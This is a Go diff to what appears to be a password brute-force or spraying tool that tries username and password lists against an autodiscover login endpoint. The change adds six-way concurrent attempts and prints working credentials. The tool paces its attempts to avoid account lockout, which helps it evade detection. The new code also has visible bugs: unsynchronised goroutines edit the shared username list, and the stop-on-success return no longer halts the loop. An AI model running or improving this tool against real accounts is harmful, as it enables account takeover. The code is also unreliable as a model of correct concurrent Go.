@@ -92,46 +92,50 @@ func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSu
 		return
 	}
 
-	result := make(chan Result)
-	count := 0
 	attempts := 0
+
+	concurrency := 6
+	//stop := make(chan bool, 1)
 
 	for _, p := range passwords {
 		if p != "" {
 			attempts++
 		}
-		count = 0
+		sem := make(chan bool, concurrency)
+
 		for ui, u := range usernames {
 			if u == "" || p == "" {
 				continue
 			}
-			count++
+
+			sem <- true
+
 			go func(u string, p string, i int) {
+				defer func() { <-sem }()
 				out := connect(autodiscoverURL, u, p, basic, insecure)
 				out.Index = i
-				result <- out
-			}(u, p, ui)
-		}
 
-		for i := 0; i < count; i++ {
-			select {
-			case res := <-result:
-				if verbose == true && res.Status != 200 {
-					fmt.Printf("[x] Failed: %s:%s\n", res.Username, res.Password)
-					if res.Error != nil {
-						fmt.Printf("[x] An error occured in connection - %s\n", res.Error)
+				if verbose == true && out.Status != 200 {
+					fmt.Printf("[x] Failed: %s:%s\n", out.Username, out.Password)
+					if out.Error != nil {
+						fmt.Printf("[x] An error occured in connection - %s\n", out.Error)
 					}
 				}
-				if res.Status == 200 {
-					fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", res.Username, res.Password)
+				if out.Status == 200 {
+					fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", out.Username, out.Password)
 					//remove username from username list (we don't need to brute something we know)
-					usernames = append(usernames[:res.Index], usernames[res.Index+1:]...)
+					usernames = append(usernames[:out.Index], usernames[out.Index+1:]...)
 				}
-				if stopSuccess == true && res.Status == 200 {
+				if stopSuccess == true && out.Status == 200 {
+					//stop <- true
 					return
 				}
-			}
+			}(u, p, ui)
 		}
+		for i := 0; i < cap(sem); i++ {
+			sem <- true
+		}
+
 		if attempts == consc {
 			fmt.Printf("\033[31m[*] Multiple attempts. To prevent lockout - delaying for %d minutes.\033[0m\n", delay)
 			time.Sleep(time.Minute * (time.Duration)(delay))
@@ -252,6 +256,7 @@ func connect(autodiscoverURL, user, password string, basic, insecure bool) Resul
 	}
 
 	defer resp.Body.Close()
+
 	result.Status = resp.StatusCode
 	return result
 }
